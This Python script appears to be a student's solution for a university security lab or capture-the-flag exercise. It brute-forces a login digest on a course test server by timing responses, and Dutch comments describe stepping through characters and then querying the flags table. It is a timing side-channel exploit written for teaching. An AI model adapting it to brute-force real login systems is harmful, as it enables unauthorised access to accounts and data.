#!/usr/bin/env python3

import hashlib
import socket
import time

HOST = "cns-test.idlab.uantwerpen.be"
PORT = 50012


def recv_until(sock, marker):
    data = b""

    while marker.encode() not in data:

        chunk = sock.recv(1024)

        if not chunk:
            break

        data += chunk

    return data.decode()


def main():
    for c in "abcdefghijklmnopqrstuvwxyz0123456789":

        #Doe dit tot je alle letters hebt en getallen, dit gaat 20 lang zijn en dan moet je het wachten
        #Op het einde moet je Select * from flags op de server doen
        digest = "add"+32*c
        print(c, digest)

        with socket.create_connection(
                (HOST, PORT)
        ) as sock:

            print(recv_until(
                sock,
                "required"
            ),
                end="\n")

            #username = input("Username: ")
            #password = input("Password: ")

            #digest = hashlib.md5(
            #    (password + username).encode()
            #).hexdigest()


    #Pas dit aan en probeer random dingen, bij alleen a's zie je dat login time langer is.
    #Dus je weet dat het eerste een a is waarschijnlijk, nu moet je het volgende ding ook zo brute forcen.
            #Je hebt een scriptje nodig dat kijkt naar de lengte van login, en dan de kortste kiest
            #Als je dit doet ga je zien dat het het langste duurt bij ¨admin¨
            #Verder kan je useless prints wegdoen om het sneller te laten gaan

            sock.sendall(
                (digest + "\n").encode()
            )
            mark = time.time()
            data = recv_until(
                sock,
                "ctfdb=> "
            )

            print(f"Login took {(time.time() - mark) * 1000} ms")
            print(data, end="")
            while True:

                if (
                        "authentication failed" in data.lower()
                ):
                    break

                if "bye." in data.lower():
                    return

                command = input()

                sock.sendall(
                    (command + "\n").encode()
                )

                data = recv_until(
                    sock,
                    "ctfdb=> "
                )
                print(data, end="")


if __name__ == "__main__":
    main()